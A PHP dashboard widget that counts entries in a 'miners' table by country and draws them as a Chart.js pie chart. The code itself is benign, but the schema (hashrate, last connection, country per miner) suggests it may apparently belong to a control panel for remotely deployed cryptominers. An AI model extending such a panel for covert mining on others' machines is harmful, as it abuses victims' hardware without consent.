<?php
require_once dirname(__DIR__, 2) . '/assets/php/templates.php';
require_once dirname(__DIR__, 2) . '/security.php';

$CountriesQuery = getConn()->query("SELECT ms_algorithm, ms_hashrate, ms_lastConnection, ms_status, ms_creationDate, ms_country FROM miners");
$miners = $CountriesQuery->fetchAll(PDO::FETCH_ASSOC);

$countriesArray = array();

foreach ($miners as $miner) {
    if ($miner['ms_country'] != 'Unknown') {
        if (!isset($countriesArray[$miner['ms_country']])) {
            $countriesArray[$miner['ms_country']] = 0;
        }
        $countriesArray[$miner['ms_country']]++;
    }
}


asort($countriesArray);

?>
<div class="plus-section">
    <div style="height: 400px; width: 400px;" class="plus-box">
        <h2>Total Countries</h2>
        <div style="background-color:#343a40;">
            <canvas id="chartCountries"></canvas>
        </div>
    </div>
</div>

<script>

    var myChartCountry = null;

    function createChartCountry() {
        if (myChartCountry != null) {
            myChartCountry.clear();
            myChartCountry.destroy();
        }

        var timestamp = new Date().getTime();

        // Get the JSON data from PHP
        var statsData = <?php echo json_encode($countriesArray) ?>;

        // Extract labels and data from the JSON
        var labels = Object.keys(statsData);
        var data = Object.values(statsData);

        // Create a pie chart
        var ctx = document.getElementById('chartCountries').getContext('2d');
        myChartCountry = new Chart(ctx, {
            type: 'pie',
            data: {
                labels: labels,
                datasets: [{
                    data: data,
                    borderWidth: 1
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                title: {
                    display: true,
                    text: 'Country Stats'
                },
                plugins: {
                    legend: {
                        display: false
                    },
                }
            }
        });
    }

    createChartCountry();
</script>